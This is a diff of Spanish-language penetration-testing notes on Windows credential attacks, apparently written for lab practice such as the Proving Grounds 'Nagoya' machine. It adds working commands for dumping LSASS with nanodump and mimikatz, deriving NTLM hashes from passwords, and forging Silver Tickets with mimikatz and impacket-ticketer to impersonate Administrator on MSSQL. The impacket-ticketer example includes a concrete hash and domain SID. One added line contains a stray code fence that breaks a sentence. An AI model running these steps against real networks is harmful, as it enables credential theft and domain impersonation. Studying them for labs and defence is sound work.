@@ -71,6 +71,8 @@ pypykatz lsa minidump /path/to/lsass.dmp
 	nxc smb $target -u $username -p $password -M nanodump
 	# Quizás puede arrojar más información
 	nxc smb $target -u $username -p $password --lsa
+	# Algunos hashes hay que craquearlos
+	
 	```
 
 ### Mimikatz
@@ -371,8 +373,19 @@ sekurlsa::ekeys
 Con las claves extraídas [[Credenciales en Windows#OverPass-the-Hash#Generar un TGT| hacer un ataque como en overpass the hash]]
 
 ## Silver ticket (Ataque TGS)
+Se ve muy bien explicado un ataque de este tipo en la máquina [Nagoya](https://medium.com/@0xrave/nagoya-proving-grounds-practice-walkthrough-active-directory-bef41999b46f) de PG
+Ejemplo de escenario en el que tiene sentido usar un ticket de este tipo. Supongamos que tenemos credenciales válidas para un servicio SPN sobre el que hemos hecho kerberoasting (ej: `svc_sql:Password123!`) y conseguimos acceso al servicio **MSSQL** desde Kali usando **autenticación Windows (`--windows-auth`)**:
+```bash
+impacket-mssqlclient dominio.local/svc_sql@192.168.1.100 -windows-auth
+```
+Si ahora intentamos ejecutar algún comando tipo `execute xp_cmdshell` no podemos. Esto puede ser normal, ya que puede que al usuario `svc_sql` no se le hayan concedido estos permisos
+
+Solución: Suplantar al usuario administrador con un Silver ticket gracias a que tenemos el ntlm hash de `svc_sql` (tenemos la contraseña, luego generar el hash no es problema)
+
 ### Información necesaria
-Crea un **TGS (Ticket Granting Service) falso** para un servicio específico en un servidor. Normalmente este tipo de ataque se realizará después de encontrar un hash de un servicio. Necesitamos lo siguiente
+Crea un **TGS (Ticket Granting Service) falso, sin necesidad de contactar con el DC** para un servicio específico en un servidor. Normalmente este tipo de ataque se realizará después de encontrar un hash de un servicio. 
+
+Necesitamos lo siguiente
 
 1. **Encontrar servicios SPN** 
 	```bash
@@ -382,6 +395,8 @@ Crea un **TGS (Ticket Granting Service) falso** para un servicio específico en 
 	```powershell
 	.\mimikatz.exe privilege::debug sekurlsa::logonpasswords exit *> dumpLSASS.txt
 	# Buscar el hash del servicio en dumpLSASS.txt
+	# Si tenemos la contraseña en texto plano, supongamos Service1, podemos generar el hash buscando en internet: ntlm hash generator ó
+	echo -n 'Service1' | iconv -f UTF-8 -t UTF-16LE | openssl dgst -md4
 	```
 3. **SID del dominio** (`/sid:S-1-5-21-XXXX`)
 	```powershell
@@ -414,10 +429,10 @@ Crea un **TGS (Ticket Granting Service) falso** para un servicio específico en 
 	```
 7. **Usuario que suplantas (opcional)** 
 	```
-	USUARIO CON EL QUE TENEMOS ACCESO A PS	
+	Administrator
 	```
 ### Creación de tiquet
-#### Inyección directa 
+#### Inyección directa - mimikatz
 - Inyección en memoria con mimikatz
 	```powershell
 	kerberos::golden /sid:<SID_DEL_DOMINIO> /domain:<NOMBRE_DOMINIO> /ptt /target:<NOMBRE_SERVIDOR> /service:<NOMBRE_SERVICIO> /rc4:<HASH_NTLM> /user:<USUARIO>
@@ -434,7 +449,7 @@ Crea un **TGS (Ticket Granting Service) falso** para un servicio específico en 
 	```powershell
 	iwr -UseDefaultCredentials http://web04
 	```
-#### Creación de ticket
+#### Creación de ticket - mimikatz
 - Creación del ticket
 	```powerview
 	kerberos::golden /sid:<SID_DEL_DOMINIO> /domain:<NOMBRE_DOMINIO> /target:<NOMBRE_SERVIDOR> /service:<NOMBRE_SERVICIO> /rc4:<HASH_NTLM> /user:<USUARIO> /ticket:ticket.kirbi
@@ -443,10 +458,24 @@ Crea un **TGS (Ticket Granting Service) falso** para un servicio específico en 
 	```powershell
 	kerberos::ptt silver_ticket.kirbi
 	```
-- Utilización del servicio: `UseDefaultCredentials`. Si añadimos la flag `-UseDefaultCredentials` al servicio que estemos ejecutando, el servidor exige autenticación kerberos (y los tickets que hay en memoria)
+- Utilización del servicio: `UseDefaultCredentials`. Si añadimos la flag `-UseDefaultCredentials` al servicio que estemos ejecutando, el servidor exige 
+```
+- 
+- autenticación kerberos (y los tickets que hay en memoria)
+```
 	```powershell
 	iwr -UseDefaultCredentials http://web04
 	```
+#### Creación del ticket - `impacket-ticketer` + uso desde linux
+- Creación del ticket (RID opcional)
+	```bash
+	impacket-ticketer -nthash <NTLM_HASH> -domain-sid <SID_DOMINIO> -domain <DOMINIO> -spn <SPN> -user-id <RID> <USUARIO_SUPLANTADO>
+	```
+	Ejemplo:
+	```bash
+	impacket-ticketer -nthash e3a0168bc21cfb88b95c954a5b18f57c  -domain-sid 'S-1-5-21-1969309164-1513403977-1686805993' -domain NAGOYA-IND -spn MSSQL/nagoya.nagoya-industries.com -user-id 500 Administrator
+	```
+- 
 
 ## Golden ticket 
 ### Teoría
